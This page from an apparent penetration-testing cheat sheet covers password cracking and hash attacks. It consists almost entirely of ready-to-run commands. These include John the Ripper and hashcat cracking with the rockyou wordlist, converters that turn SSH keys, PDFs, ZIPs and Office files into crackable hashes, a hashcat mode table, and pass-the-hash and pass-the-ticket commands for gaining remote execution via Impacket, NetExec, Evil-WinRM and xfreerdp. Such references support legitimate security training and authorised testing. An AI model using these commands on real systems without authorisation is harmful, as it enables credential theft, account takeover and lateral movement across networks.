[← Back to Home](../README.md)

# 06 — Password Cracking & Hash Attacks

## John the Ripper

```bash
john --wordlist=rockyou.txt hashfile
john --single hashfile
john --incremental hashfile

# Convert other file formats into a crackable hash
pdf2john.py file.pdf > hash
ssh2john.py id_rsa > hash
zip2john file.zip > hash
office2john.py file.docx > hash
```

## Hashcat

```bash
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt    # NTLM
hashcat -a 0 -m 1800 linux.txt rockyou.txt   # sha512crypt
hashcat -a 3 -m 1000 hash.txt ?u?l?l?l?d?s   # Mask attack
```

**Common hash modes:**

| Mode | Hash type |
|------|-----------|
| `-m 0` | MD5 |
| `-m 100` | SHA1 |
| `-m 1000` | NTLM |
| `-m 1800` | sha512crypt |
| `-m 2100` | DCC2 |
| `-m 22100` | BitLocker |
| `-m 18200` | Kerberos AS-REP |

## Pass-the-Hash

```bash
# Impacket
impacket-psexec user@IP -hashes :NTLM_HASH
impacket-wmiexec user@IP -hashes :NTLM_HASH

# NetExec
nxc smb IP -u user -H HASH -x whoami
nxc winrm IP -u user -H HASH

# Evil-WinRM
evil-winrm -i IP -u user -H HASH

# xfreerdp
xfreerdp /v:IP /u:user /pth:HASH
```

## Pass-the-Ticket (Linux)

```bash
export KRB5CCNAME=/tmp/krb5cc_...
impacket-wmiexec dc01 -k -no-pass
smbclient //dc/share -k -c ls
```

## Related Pages

- Where these hashes usually come from → [Post-Exploitation](13-Post-Exploitation.md)
- Capturing hashes over the wire → [Service Exploitation Deep-Dive](03-Service-Exploitation-Deep-Dive.md) (Responder / NTLM relay)
- Online brute forcing instead of offline cracking → [Brute Force & Credential Attacks](05-Brute-Force-and-Credential-Attacks.md)
